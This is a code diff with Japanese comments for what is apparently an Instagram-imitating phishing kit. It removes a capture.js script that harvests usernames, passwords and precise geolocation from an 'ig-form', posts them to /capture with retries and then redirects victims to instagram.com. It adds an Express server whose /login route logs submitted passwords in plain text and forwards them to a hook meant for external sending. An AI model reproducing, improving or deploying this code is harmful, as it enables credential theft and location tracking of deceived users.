@@ -1,97 +1,84 @@
-/* capture.js v2 — 通信エラー対策: タイムアウト / リトライ / エラー可視化 */
-(() => {
-  const form = document.getElementById('ig-form');
-  const btn  = document.getElementById('submit-btn');
-  const u = form.querySelector('[name="username"]');
-  const p = form.querySelector('[name="password"]');
-  const latEl = form.querySelector('[name="lat"]');
-  const lngEl = form.querySelector('[name="lng"]');
+// server.js
+'use strict';
 
-  let acc = '';
+const path = require('path');
+const express = require('express');
+const session = require('express-session');
 
-  // 位置情報は取れたら載せる（要素が無くても落ちないようガード）
-  if (navigator.geolocation) {
-    navigator.geolocation.getCurrentPosition(
-      r => {
-        if (latEl) latEl.value = r.coords.latitude;
-        if (lngEl) lngEl.value = r.coords.longitude;
-        acc = Math.round(r.coords.accuracy);
-      },
-      () => {},
-      { enableHighAccuracy: true, timeout: 8000, maximumAge: 0 }
-    );
+const PORT = process.env.PORT || 3000;
+const app = express();
+
+/* ============================================================
+   1. ヘルスチェック ── 最優先・最軽量
+      session より前に置く（認証でリダイレクトされないように）
+   ============================================================ */
+app.get('/healthz', (req, res) => {
+  res.status(200).type('text/plain').send('ok');
+});
+
+/* ============================================================
+   2. 軽量ミドルウェア（登録は同期なので起動を止めない）
+   ============================================================ */
+app.use(express.urlencoded({ extended: true }));
+app.use(express.json());
+app.use(express.static(path.join(__dirname, 'public'), { maxAge: '1h' }));
+
+app.use(session({
+  secret: process.env.SESSION_SECRET || 'change-me',
+  resave: false,
+  saveUninitialized: true,
+  cookie: { maxAge: 1000 * 60 * 60 * 24 },
+}));
+
+/* ============================================================
+   3. ルーティング
+   ============================================================ */
+app.get('/', (req, res) => {
+  res.sendFile(path.join(__dirname, 'public', 'index.html'));
+});
+
+app.post('/login', async (req, res) => {
+  const { username, password } = req.body;
+  console.log('[LOGIN]', username, password);
+
+  // ここで await してもOK（listen済みなので影響なし）
+  try {
+    if (onLogin) await onLogin(username, password);
+  } catch (e) {
+    console.error('onLogin failed:', e);
   }
 
-  function showError(msg) {
-    let box = form.querySelector('.error');
-    if (!msg) { if (box) box.remove(); return; }
-    if (!box) {
-      box = document.createElement('div');
-      box.className = 'error';
-      form.insertBefore(box, btn); // パスワード欄とボタンの間
-    }
-    box.textContent = msg;
-  }
+  res.redirect('/?ok=1');
+});
 
-  const sync = () => { btn.disabled = !(u.value.trim() && p.value.trim()); };
-  u.addEventListener('input', sync);
-  p.addEventListener('input', sync);
-  sync();
+/* ============================================================
+   4. ★ ここが本題 ── 重い初期化より先にポートを開ける
+   ============================================================ */
+const server = app.listen(PORT, () => {
+  console.log('listening on ' + PORT);
+});
 
-  const sleep = ms => new Promise(r => setTimeout(r, ms));
+/* ============================================================
+   5. 重い初期化は listen の「後」（並列で走る）
+   ============================================================ */
+let onLogin = null;
 
-  // タイムアウト付きPOST。通信失敗は retryable を立てて返す（例外は投げない）
-  const post = async (fd, timeoutMs = 20000) => {
-    const ctl = new AbortController();
-    const t = setTimeout(() => ctl.abort(), timeoutMs);
-    try {
-      const r = await fetch('/capture', {
-        method: 'POST',
-        body: fd,
-        headers: { 'X-Requested-With': 'fetch' },
-        signal: ctl.signal,
-      });
-      const ct = r.headers.get('content-type') || '';
-      if (!ct.includes('application/json')) {
-        return { ok: false, retryable: true, error: `サーバーエラー (${r.status})` };
-      }
-      return await r.json();
-    } catch (e) {
-      return {
-        ok: false,
-        retryable: true,
-        error: e.name === 'AbortError'
-          ? 'タイムアウト（サーバー応答なし）'
-          : '通信エラー',
-      };
-    } finally {
-      clearTimeout(t);
-    }
+async function init() {
+  // await connectDB();          // ← DB接続などがあればここ
+  onLogin = async (u, p) => {
+    // 外部送信・通知などの処理
   };
+  console.log('init done');
+}
 
-  form.addEventListener('submit', async e => {
-    e.preventDefault();
-    showError('');
-    btn.disabled = true;
+init().catch((e) => console.error('init failed:', e));
 
-    const fd = new FormData(form);
-    if (acc) fd.append('acc', acc);
+/* ============================================================
+   6. 落ちにくくする（任意だが推奨）
+   ============================================================ */
+process.on('unhandledRejection', (e) => console.error('unhandledRejection', e));
+process.on('uncaughtException', (e) => console.error('uncaughtException', e));
 
-    let res;
-    for (let i = 0; i < 3; i++) {
-      btn.textContent = i ? `再試行中... (${i}/3)` : 'ログイン中...';
-      res = await post(fd);
-      // パスワード違い（確定エラー）は再試行しない＝無駄なログインを減らす
-      if (res.ok || !res.retryable) break;
-      await sleep(1000 * 2 ** i); // 1s → 2s → 4s
-    }
-
-    if (res.ok) { location.href = 'https://www.instagram.com/'; return; }
-
-    showError(res.error || 'ユーザー名またはパスワードが正しくありません。');
-    p.value = '';
-    p.focus();
-    btn.textContent = 'ログイン';
-    sync();
-  });
-})();
+['SIGTERM', 'SIGINT'].forEach((sig) => {
+  process.on(sig, () => server.close(() => process.exit(0)));
+});
